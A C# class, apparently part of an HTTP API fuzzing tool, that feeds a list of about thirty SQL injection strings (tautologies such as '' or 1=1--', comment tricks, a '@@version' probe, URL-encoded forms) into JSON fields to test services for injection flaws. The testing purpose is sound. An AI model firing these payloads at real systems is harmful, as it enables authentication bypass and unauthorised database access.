using System.Collections.Generic;

namespace ByrneLabs.TestoRoboto.HttpServices.Mutators.JsonMutators
{
    public class SqlInjector : ValueChanger
    {
        protected override IEnumerable<object> TestValues => new object[]
        {
            @"or",
            @"' or ''='",
            @" or 0=0 #""",
            @"' or 0=0 --",
            @"' or 0=0 #",
            @""" or 0=0 --",
            @"or 0=0 --",
            @"or 0=0 #",
            @"' or 1 --'",
            @"' or 1/*",
            @"; or '1'='1'",
            @"' or '1'='1",
            @"' or '1'='1'--",
            @"' or 1=1",
            @"' or 1=1 /*",
            @"' or 1=1--",
            @"' or 1=1-- ",
            @"'/**/or/**/1/**/=/**/1",
            @"‘ or 1=1 --",
            @""" or 1=1--",
            @"or 1=1",
            @"or 1=1--",
            @" or 1=1 or """"=",
            @"' or 1=1 or ''='",
            @"' or 1 in (select @@version)--",
            @"or%201=1",
            @"or%201=1 --",
            @"' or 2 > 1",
            @"' or 2 between 1 and 3"
        };
    }
}
